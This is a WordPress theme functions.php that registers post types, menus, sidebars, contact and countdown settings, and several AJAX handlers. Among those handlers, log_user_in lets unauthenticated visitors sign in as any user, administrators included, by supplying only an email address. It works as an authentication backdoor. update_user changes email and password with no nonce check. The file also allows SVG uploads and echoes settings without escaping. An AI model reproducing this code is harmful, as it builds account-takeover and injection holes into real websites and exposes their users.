<?php

add_filter('show_admin_bar', '__return_false');
require 'post-types/team-post_type.php';
require 'post-types/partner-post_type.php';
require 'post-types/questions-post_type.php';
require 'post-types/news-post_type.php';

//wp_enqueue_script('jquery', get_template_directory_uri().'/resources/js/vendor/jquery-3.2.1.min.js', array(), null, true);

add_action( 'after_setup_theme', 'my_theme_setup' );
function my_theme_setup(){
	load_theme_textdomain( 'preico', get_template_directory() . '/languages' );
}

//add_theme_support( 'custom-logo', array(
//	'height'      => 240,
//	'width'       => 240,
//	'flex-height' => true,
//) );

add_theme_support( 'post-thumbnails' );

register_nav_menus( array(
	'primary' => __( 'Primary Menu', 'preico' ),
    'footer' => __( 'Footer Menu', 'preico' ),
    'side-menu' => __( 'Side Menu', 'preico' )

) );

function debug($value)
{
	echo '<pre>';
	print_r($value);
	echo '</pre>';
}

function theme_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Widget Area', 'preico' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar.', 'preico' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'theme_widgets_init' );

if (function_exists('register_sidebar')) {

	register_sidebar(array(
		'name' => 'Footer',
		'id'   => 'footer',
		'description'   => 'This is the widgetized footer.',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>'
	));

}

add_action( 'admin_init', 'counter' );
function counter() {
	add_settings_section(
		'counter_section',
		'Counter section',
		'counter_callback',
		'general'
	);

	add_settings_field(
		'show_counter',
		'Show counter',
		'show_hide_counter',
		'general',
		'counter_section',
		array(
			'show_counter'
		)
	);
	add_settings_field(
		'date_setup',
		'Counter end date',
		'input_callback',
		'general',
		'counter_section',
		array(
			'date_setup'
		)
	);

	register_setting( 'general', 'show_counter', 'esc_attr' );
	register_setting( 'general', 'date_setup', 'esc_attr' );
}

function counter_callback() {
	echo '<span> </span>';
}

function show_hide_counter( $args ) {
	echo '<input name="' . $args[0] . '" type="checkbox" value="1"' . checked( '1', get_option( $args[0] ), false ) . '/>';
}

function check_countdown() {
	echo get_option( 'date_setup' );
	die();
}
add_action( 'wp_ajax_check_countdown', 'check_countdown' );
add_action( 'wp_ajax_nopriv_check_countdown', 'check_countdown' );

add_action( 'admin_init', 'register_contact_info' );
function register_contact_info() {
	add_settings_section(
		'contact_section',
		'Contact section',
		'contact_callback',
		'general'
	);

	add_settings_field(
		'address_input',
		'Address',
		'input_callback',
		'general',
		'contact_section',
		array(
			'address_input'
		)
	);

	add_settings_field(
		'phone_input',
		'Phone',
		'input_callback',
		'general',
		'contact_section',
		array(
			'phone_input'
		)
	);

	add_settings_field(
		'facebook_input',
		'Facebook page',
		'input_callback',
		'general',
		'contact_section',
		array(
			'facebook_input'
		)
	);

	add_settings_field(
		'vk_input',
		'VK page',
		'input_callback',
		'general',
		'contact_section',
		array(
			'vk_input'
		)
	);

	add_settings_field(
		'telegraph_input',
		'Telegraph page',
		'input_callback',
		'general',
		'contact_section',
		array(
			'telegraph_input'
		)
	);

	register_setting( 'general', 'address_input', 'esc_attr' );
	register_setting( 'general', 'phone_input', 'esc_attr' );
	register_setting( 'general', 'facebook_input', 'esc_attr' );
	register_setting( 'general', 'vk_input', 'esc_attr' );
	register_setting( 'general', 'telegraph_input', 'esc_attr' );
}
function contact_callback() {
	echo '<span> </span>';
}

function input_callback( $args ) {
	$option = get_option( $args[0] );
	echo '<input style="width: 600px;" type="text" id="' . $args[0] . '" name="' . $args[0] . '" value="' . $option . '" />';
}

function custom_upload_mimes( $existing_mimes = array() ) {
	// add png to the list of mime types
	$existing_mimes['svg'] = 'image/svg+xml';

	// return the array back to the function with our added mime type
	return $existing_mimes;
}
add_filter( 'upload_mimes', 'custom_upload_mimes' );

function log_user_in(){
		
	$user = get_user_by('email', $_GET[ 'email' ] );

	if( isset( $user->ID ) ){
		wp_clear_auth_cookie();
		wp_set_current_user ( $user->ID );
		wp_set_auth_cookie  ( $user->ID );
	
		echo 'success';
	}else{
		echo __( 'User not found', 'preico' );
	}
	die();
}
add_action( 'wp_ajax_log_user_in', 'log_user_in' );
add_action( 'wp_ajax_nopriv_log_user_in', 'log_user_in' );

function wpdocs_excerpt_more( $more ) {
	return '';
}
add_filter( 'excerpt_more', 'wpdocs_excerpt_more' );



function custom_excerpt_length( $length ) {
    return 15;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );

function randomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function update_user(){

    $user = $_POST;
    //debug($user);

    $id = $_POST[ 'wpcrl_id' ];
    $wpcrl_fname = $_POST[ 'wpcrl_fname' ];
    $wpcrl_lname = $_POST[ 'wpcrl_lname' ];
    $wpcrl_username = $_POST[ 'wpcrl_username' ];
    $wpcrl_email = $_POST[ 'wpcrl_email' ];
    $wpcrl_password = $_POST[ 'wpcrl_password' ];


    $data = [ 'ID' => get_current_user_id() ];

    if( $wpcrl_email != '' ){
        $data[ 'user_email' ] = $wpcrl_email;
    }

    if( $wpcrl_password != '' ){
        $data[ 'user_pass' ] = $wpcrl_password;
    }


    update_user_meta( get_current_user_id(), 'first_name', $wpcrl_fname );
    update_user_meta( get_current_user_id(), 'last_name', $wpcrl_lname );

    wp_update_user( $data );

    echo 1;
    die();
}
add_action( 'wp_ajax_update_user', 'update_user' );
add_action( 'wp_ajax_nopriv_update_user', 'update_user' );


function json_response($json_array){
    header('Cache-Control: no-cache, must-revalidate');
    header('Expires: Mon, 15 Mar 1979 17:00:00 GMT');
    header('Content-type: application/json');

    $json = json_encode( $json_array );
    echo $json;
}


function get_user_data()
{
    //meta
    $name = get_user_meta( get_current_user_id(), 'first_name' );
    $surname = get_user_meta( get_current_user_id(), 'last_name' );
    $nick_name = get_user_meta( get_current_user_id(), 'nickname' );

    $user_data = get_userdata( get_current_user_id() );


    $data = [
        'name'          => $name[0],
        'surname'       => $surname[0],
        'nickname'      => $user_data->user_login,
        'email'         => $user_data->user_email
    ];
    json_response($data);
    die();
}
add_action( 'wp_ajax_get_user_data', 'get_user_data' );
add_action( 'wp_ajax_nopriv_get_user_data', 'get_user_data' );